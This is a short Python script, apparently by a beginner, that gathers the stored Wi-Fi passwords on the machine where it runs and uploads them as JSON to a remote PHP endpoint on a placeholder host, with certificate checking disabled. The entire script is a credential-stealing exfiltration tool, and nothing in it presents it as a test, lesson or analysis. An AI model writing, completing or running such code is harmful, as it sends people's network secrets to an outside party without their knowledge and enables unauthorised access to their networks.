import http.client
import requests
import json
from myfirstfunction import getwifipasswords

url = 'yourwebsite.com/upload.php'

wifidata = getwifipasswords()
print(wifidata)

r = requests.post(url, verify=False, json=wifidata)